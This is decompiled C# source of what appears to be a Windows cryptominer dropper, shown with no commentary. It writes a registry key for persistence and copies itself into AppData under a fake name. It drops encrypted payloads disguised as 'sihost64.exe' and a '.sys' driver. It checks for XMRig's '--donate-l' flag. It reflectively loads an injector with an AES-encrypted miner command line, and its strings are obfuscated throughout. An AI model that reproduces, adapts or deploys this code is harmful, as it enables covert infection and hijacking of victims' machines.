using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using h3i1ECwXWt3dwb3P50;

public class Program
{
	public static string lb;

	public static string bD;

	static Program()
	{
		nNnHslUN2ccm7jpXDV.MpUPQXdeOAYR1();
		lb = Conversions.ToString(GetString("b0OMVdEmdDVZ7u3lLS4elA=="));
		bD = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + lb;
	}

	public Program()
	{
		nNnHslUN2ccm7jpXDV.MpUPQXdeOAYR1();
		base._002Ector();
	}

	[STAThread]
	public static void Main()
	{
		Registry.CurrentUser.CreateSubKey(Conversions.ToString(GetString("tLPNqYcrCAAN3BiYUtFLdTPmYKRyQu+wGAS54YBLukcy68xT/rajD1Jdiw+vAbza"))).SetValue(Path.GetFileName(Path.Combine(Interaction.Environ("AppData"), "smssmanagment.exe")), Path.Combine(Interaction.Environ("AppData"), "smssmanagment.exe"));
		Install();
		Initialize();
	}

	public static void Install()
	{
		Thread.Sleep(2000);
		try
		{
			if (Operators.CompareString(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(Interaction.Environ("AppData"), "smssmanagment.exe"), false) == 0)
			{
				return;
			}
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (Operators.CompareString(process.MainModule!.FileName, Path.Combine(Interaction.Environ("AppData"), "smssmanagment.exe"), false) == 0)
					{
						process.Kill();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			File.WriteAllBytes(Path.Combine(Interaction.Environ("AppData"), "smssmanagment.exe"), File.ReadAllBytes(Process.GetCurrentProcess().MainModule!.FileName));
			Thread.Sleep(2000);
			BaseFolder();
			Environment.Exit(0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] GetTheResource(string Get_)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		ResourceManager resourceManager = new ResourceManager("tuisnyndtjwwxbfpumqykkrdjlhzniqnryy", executingAssembly);
		return AES_Decryptor((byte[])resourceManager.GetObject(Get_));
	}

	public static object GetString(string input)
	{
		return Encoding.ASCII.GetString(AES_Decryptor(Convert.FromBase64String(input)));
	}

	public static void Run(byte[] PL, string arg, byte[] buffer)
	{
		try
		{
			Assembly.Load(PL).GetType(Conversions.ToString(GetString("avTLmdnVCl/LLNipdTMj42xxLpHZB3PfIwxlGog/CaQ=")))!.GetMethod(Conversions.ToString(GetString("ZIm4vJPRHoLENjDN4LrmGA==")), BindingFlags.Static | BindingFlags.Public)!.Invoke(null, new object[3]
			{
				buffer,
				Operators.ConcatenateObject(Operators.ConcatenateObject(GetString("M9Y3TccwKbuuepA+1rHN/Q=="), (object)"\\"), GetString("Cn0oWr8URfTL8ryKYOGZMg==")),
				arg
			});
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void BaseFolder()
	{
		try
		{
			Directory.CreateDirectory(bD);
			new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + lb.Split(new char[1] { '\\' })[0]);
			Process[] processesByName = Process.GetProcessesByName("sihost64");
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
			Thread.Sleep(3000);
			File.WriteAllBytes(bD + "sihost64.exe", GetTheResource("njokfjdxwuedivwfpt"));
			if (Process.GetProcessesByName("sihost64").Length < 1)
			{
				Process.Start(bD + "sihost64.exe");
			}
			File.WriteAllBytes(bD + "WR64.sys", GetTheResource("yvoaqdgeruuf"));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static object KillLastProc()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a9: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ConnectionOptions val = default(ConnectionOptions);
		ManagementScope val2 = default(ManagementScope);
		string text = default(string);
		ObjectQuery val3 = default(ObjectQuery);
		ManagementObjectSearcher val4 = default(ManagementObjectSearcher);
		ManagementObjectCollection val5 = default(ManagementObjectCollection);
		ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
		ManagementObject val6 = default(ManagementObject);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 352:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_001b;
						case 5:
							goto IL_003a;
						case 6:
							goto IL_0044;
						case 7:
							goto IL_0062;
						case 8:
							goto IL_006e;
						case 9:
							goto IL_007b;
						case 10:
							goto IL_0086;
						case 11:
							goto IL_00a9;
						case 14:
						case 15:
							goto IL_00ca;
						case 16:
							goto IL_00db;
						case 12:
							goto IL_00eb;
						case 13:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 17:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00eb:
					num = 12;
					Environment.Exit(0);
					break;
					IL_0008:
					num = 2;
					val = new ConnectionOptions();
					goto IL_0011;
					IL_0011:
					num = 3;
					val.set_Impersonation((ImpersonationLevel)3);
					goto IL_001b;
					IL_001b:
					num = 4;
					val2 = new ManagementScope("\\\\" + Environment.UserDomainName + "\\root\\cimv2", val);
					goto IL_003a;
					IL_003a:
					num = 5;
					val2.Connect();
					goto IL_0044;
					IL_0044:
					num = 6;
					text = string.Format("Select CommandLine from Win32_Process where Name='{0}'", RuntimeHelpers.GetObjectValue(GetString("Cn0oWr8URfTL8ryKYOGZMg==")));
					goto IL_0062;
					IL_0062:
					num = 7;
					val3 = new ObjectQuery(text);
					goto IL_006e;
					IL_006e:
					num = 8;
					val4 = new ManagementObjectSearcher(val2, val3);
					goto IL_007b;
					IL_007b:
					num = 9;
					val5 = val4.Get();
					goto IL_0086;
					IL_0086:
					num = 10;
					enumerator = val5.GetEnumerator();
					goto IL_0092;
					IL_0092:
					if (enumerator.MoveNext())
					{
						val6 = (ManagementObject)enumerator.get_Current();
						goto IL_00a9;
					}
					((IDisposable)enumerator)?.Dispose();
					goto IL_00db;
					IL_00db:
					num = 16;
					obj = false;
					goto end_IL_0000_3;
					IL_00a9:
					num = 11;
					if (!((ManagementBaseObject)val6).get_Item("CommandLine").ToString()!.Contains("--donate-l"))
					{
						goto IL_00ca;
					}
					goto IL_00eb;
					IL_00ca:
					num = 15;
					goto IL_0092;
					end_IL_0000_2:
					break;
				}
				num = 13;
				obj = true;
				break;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 352;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		object result = obj;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void Initialize()
	{
		if (Versioned.IsNumeric((object)"45") && Conversions.ToInteger("45") > 0)
		{
			Thread.Sleep(checked(Conversions.ToInteger("45") * 1000));
		}
		try
		{
			byte[] theResource = GetTheResource("ugobmgeqvptitazrjhelskyesnnrijpiyetfdrz");
			byte[] buffer = new byte[0];
			string text = "";
			BaseFolder();
			try
			{
				try
				{
					using ZipArchive zipArchive = new ZipArchive(new MemoryStream(theResource));
					foreach (ZipArchiveEntry entry in zipArchive.Entries)
					{
						if (!entry.FullName.Contains("xm"))
						{
							continue;
						}
						using Stream stream = entry.Open();
						object obj = new MemoryStream();
						try
						{
							stream.CopyTo((Stream)obj);
							buffer = (byte[])NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
						}
						finally
						{
							if (obj != null)
							{
								((IDisposable)obj).Dispose();
							}
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			string text2 = Conversions.ToString(Operators.AddObject(GetString("wxL+J74DOlmoVXK1US5LbHvWhSPExg+WtFXNyFmN2nd/cZqrXwr+KRWYdJRlveX3dG+9w0fjItbm8AICpHV+EWzOBU1xvKRTbUwgwgZ7F5jiycTb48cNmXbZNMALAEs5Xlva5MBeslEVIACnCRByZok1a+Si0oVxFSlscZy5zjYkPGAZqDY58yNMouv88mOo1QxziWUUMV5CB3C/qbXLOj8fDDEkvX4aXBO88FycLp/xPUw2HdFuFz23+srmd+PKJWlLjtYiUE5kTpyvPFvtj/1AcoFKpyJv/LW8833OUQz9Op3Jwui8FEcYjOAa73k3QynJVymMrePmROx+oS59qFaZLXwQmgrK3kPTMugoBmLzimEGWGZX/8PwtOmVxn17x7ejbq2H3jJ1mQSkU4l42Q=="), (object)text));
			text2 = Strings.Replace(text2, "{%RANDOM%}", Guid.NewGuid().ToString().Replace("-", "")
				.Substring(0, 10), 1, -1, (CompareMethod)0);
			text2 = Strings.Replace(text2, "{%COMPUTERNAME%}", Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", "").Substring(0, 10), 1, -1, (CompareMethod)0);
			KillLastProc();
			Run(GetTheResource("lmcggklkemzsqxglkyzlnlgmrltfvdcjymwfln"), text2, buffer);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] AES_Decryptor(byte[] input)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes("jlqfm"));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
